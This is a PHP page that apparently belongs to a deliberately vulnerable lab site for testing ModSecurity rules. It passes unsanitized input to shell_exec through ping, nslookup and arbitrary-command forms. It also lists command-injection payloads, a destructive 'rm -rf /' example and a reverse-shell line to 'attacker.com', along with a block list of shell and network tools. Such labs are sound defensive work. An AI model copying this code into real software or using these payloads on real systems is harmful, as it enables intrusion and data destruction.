<?php
/**
 * COMMAND EXECUTION PAGE - VULNERABLE TO COMMAND INJECTION
 * 
 * WARNING: This code is intentionally insecure for ModSecurity testing purposes
 * VULNERABILITY: OS Command Injection via unsanitized user input
 * DO NOT USE IN PRODUCTION!
 * 
 * This page is specifically designed for testing Requirement #4:
 * "Viết rule nâng cao để phát hiện và ngăn chặn tấn công Command Injection & OS Injection"
 */

session_start();

$result = '';
$command = '';
$error = '';

// Handle command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'ping') {
        $host = $_POST['host'] ?? '';
        
        if (!empty($host)) {
            // VULNERABILITY: Direct command execution without sanitization
            // This allows command injection attacks
            $command = "ping -c 4 " . $host;
            
            // Execute command and capture output
            $output = shell_exec($command . " 2>&1");
            $result = $output ?: "No output returned";
        } else {
            $error = "Please enter a host to ping";
        }
    } 
    elseif ($action === 'nslookup') {
        $domain = $_POST['domain'] ?? '';
        
        if (!empty($domain)) {
            // VULNERABILITY: Another command injection point
            $command = "nslookup " . $domain;
            
            $output = shell_exec($command . " 2>&1");
            $result = $output ?: "No output returned";
        } else {
            $error = "Please enter a domain to lookup";
        }
    }
    elseif ($action === 'custom') {
        $custom_cmd = $_POST['custom_cmd'] ?? '';
        
        if (!empty($custom_cmd)) {
            // VULNERABILITY: Direct arbitrary command execution!
            // Extremely dangerous - allows full system access
            $command = $custom_cmd;
            
            $output = shell_exec($command . " 2>&1");
            $result = $output ?: "No output returned";
        } else {
            $error = "Please enter a command";
        }
    }
}

$logged_in = isset($_SESSION['username']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Execution - ModSecurity Testing Site</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💻 Command Execution</h1>
            <p>Vulnerability Testing Lab - Educational Purpose Only</p>
        </div>
        
        <nav>
            <a href="index.php">Login</a>
            <a href="search.php">Search</a>
            <a href="upload.php">Upload</a>
            <a href="command.php" class="active">Command</a>
            <a href="admin.php">Admin</a>
            <?php if ($logged_in): ?>
                <a href="logout.php">Logout (<?php echo htmlspecialchars($_SESSION['username']); ?>)</a>
            <?php endif; ?>
        </nav>
        
        <div class="content">
            <div class="warning-box" style="background: #f8d7da; border-color: #dc3545;">
                <h3>🚨 CRITICAL VULNERABILITY</h3>
                <p><strong>VULNERABILITY: OS Command Injection</strong></p>
                <p>This page executes system commands without ANY sanitization - extremely dangerous!</p>
                <p><strong>Test payloads for Command Injection:</strong></p>
                <ul>
                    <li><code>google.com; whoami</code> - Command chaining with semicolon</li>
                    <li><code>google.com && cat /etc/passwd</code> - AND operator</li>
                    <li><code>google.com || id</code> - OR operator</li>
                    <li><code>google.com | ls -la</code> - Pipe operator</li>
                    <li><code>google.com `whoami`</code> - Command substitution</li>
                    <li><code>google.com $(cat /etc/hosts)</code> - Command substitution</li>
                    <li><code>8.8.8.8 & sleep 10 &</code> - Background execution</li>
                </ul>
                <p><strong>⚠️ This page is designed for testing Requirement #4:</strong><br>
                "Viết rule nâng cao để phát hiện và ngăn chặn tấn công Command Injection & OS Injection"</p>
            </div>
            
            <?php if ($error): ?>
                <div class="error-message">
                    <strong>❌ Error:</strong> <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>
            
            <!-- PING Tool -->
            <h2>Ping Tool <span class="vulnerability-tag">COMMAND INJECTION</span></h2>
            <form method="POST" action="command.php">
                <input type="hidden" name="action" value="ping">
                <div class="form-group">
                    <label for="host">Host/IP Address:</label>
                    <input type="text" id="host" name="host" placeholder="e.g., google.com or 8.8.8.8" required>
                    <small style="color: #666;">Try: <code>google.com; ls -la</code></small>
                </div>
                <button type="submit" class="btn">Execute Ping</button>
            </form>
            
            <hr style="margin: 30px 0; border: 1px solid #ddd;">
            
            <!-- NSLOOKUP Tool -->
            <h2>DNS Lookup Tool <span class="vulnerability-tag">COMMAND INJECTION</span></h2>
            <form method="POST" action="command.php">
                <input type="hidden" name="action" value="nslookup">
                <div class="form-group">
                    <label for="domain">Domain Name:</label>
                    <input type="text" id="domain" name="domain" placeholder="e.g., example.com" required>
                    <small style="color: #666;">Try: <code>google.com && whoami</code></small>
                </div>
                <button type="submit" class="btn">Execute Lookup</button>
            </form>
            
            <hr style="margin: 30px 0; border: 1px solid #ddd;">
            
            <!-- CUSTOM COMMAND Tool -->
            <h2>Custom Command <span class="vulnerability-tag">ARBITRARY COMMAND EXECUTION</span></h2>
            <form method="POST" action="command.php">
                <input type="hidden" name="action" value="custom">
                <div class="form-group">
                    <label for="custom_cmd">Command:</label>
                    <input type="text" id="custom_cmd" name="custom_cmd" placeholder="Enter any system command" required>
                    <small style="color: #dc3545;">⚠️ EXTREMELY DANGEROUS - Executes any command!</small>
                </div>
                <button type="submit" class="btn btn-danger">Execute Command</button>
            </form>
            
            <?php if ($result): ?>
                <div class="results-box">
                    <h3>Command Output</h3>
                    <p><strong>Executed Command:</strong> <code><?php echo htmlspecialchars($command); ?></code></p>
                    <pre><?php echo htmlspecialchars($result); ?></pre>
                </div>
            <?php endif; ?>
            
            <div class="code-block" style="margin-top: 30px;">
                <strong>Vulnerable Code:</strong><br><br>
                <code>
                // CRITICAL VULNERABILITY - Direct command execution!<br>
                $command = "ping -c 4 " . $_POST['host'];<br>
                $output = shell_exec($command);<br>
                <br>
                // This allows injections like:<br>
                // - google.com; rm -rf /<br>
                // - 8.8.8.8 && cat /etc/passwd<br>
                // - example.com | nc attacker.com 4444 -e /bin/bash<br>
                <br>
                // NO INPUT VALIDATION OR SANITIZATION!<br>
                </code>
            </div>
            
            <div class="warning-box" style="margin-top: 20px;">
                <h3>🎯 ModSecurity Rules to Block</h3>
                <p>Your ModSecurity rules should detect and block:</p>
                <ul>
                    <li>Command separators: <code>;</code>, <code>|</code>, <code>||</code>, <code>&</code>, <code>&&</code></li>
                    <li>Command substitution: <code>`</code>, <code>$()</code></li>
                    <li>File system access: <code>cat</code>, <code>ls</code>, <code>rm</code>, etc.</li>
                    <li>Network commands: <code>nc</code>, <code>wget</code>, <code>curl</code></li>
                    <li>Shell commands: <code>/bin/bash</code>, <code>/bin/sh</code></li>
                    <li>Privilege escalation: <code>sudo</code>, <code>su</code></li>
                </ul>
            </div>
        </div>
        
        <div class="footer">
            <p>ModSecurity Testing Website | For Educational Purposes Only</p>
            <p>⚠️ DO NOT deploy this website on production servers!</p>
        </div>
    </div>
</body>
</html>
